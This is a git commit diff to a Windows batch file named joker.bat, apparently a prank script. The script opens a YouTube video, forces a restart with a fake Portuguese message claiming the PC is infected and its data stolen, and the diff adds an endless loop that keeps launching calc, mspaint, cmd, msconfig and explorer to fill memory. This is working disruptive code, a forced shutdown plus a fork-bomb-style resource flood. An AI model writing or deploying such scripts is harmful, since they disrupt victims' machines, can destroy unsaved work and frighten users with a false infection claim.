e57f7f991cc563b3ec44c5eb3d61d66af1f82fe4
Syri-Yagowo <yagovictorbotafogo@gmail.com>
2021-04-21 21:26:44 -0300

    add lotação de memória

--- joker.bat
+++ joker.bat
@@ -7,5 +7,12 @@ echo aproveite o presentinho
 timeout 5
 "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" --profile"1" https://www.youtube.com/watch?v=cCkw5V9LCyY
 timeout 20
-shutdown -r -t 30 -f -c "Seu pc esta infectado agora, obrigado pelos dados"
-
+shutdown -r -t 40 -f -c "Seu pc esta infectado agora, obrigado pelos dados"
+timeout 10
+:loop
+start calc
+start mspaint
+start cmd
+start msconfig
+start explorer
+goto loop
